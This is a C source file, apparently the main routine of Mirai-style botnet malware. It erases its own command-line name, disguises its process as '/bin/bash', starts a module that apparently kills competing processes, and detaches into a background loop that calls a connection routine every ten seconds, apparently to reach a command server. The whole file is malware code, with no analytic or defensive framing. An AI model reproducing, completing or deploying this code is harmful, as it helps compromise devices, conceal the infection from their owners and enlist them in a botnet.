#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <signal.h>
#include <sys/prctl.h>

#include "headers/util.h"
#include "headers/killer.h"
#include "headers/connection.h"

int main(int argc, char **args)
{
    ensure();

    char *arch = argc < 2 ? "unknown" : args[1];

    util_memset(args[0], 0, util_strlen(args[0]));
    prctl(PR_SET_NAME, "/bin/bash");

    signal(SIGCHLD, SIG_IGN);

    killer_init("Acid");

    if (!fork())
    {
        write(1, "$UICIDEBOY$\n", 12);
        setsid();
#ifdef DEBUG
        printf("[main] started (%d)\n", getpid());
#endif
        while (1)
        {
            connection(arch);
            sleep(10);
        }
    }
    return 0;
}
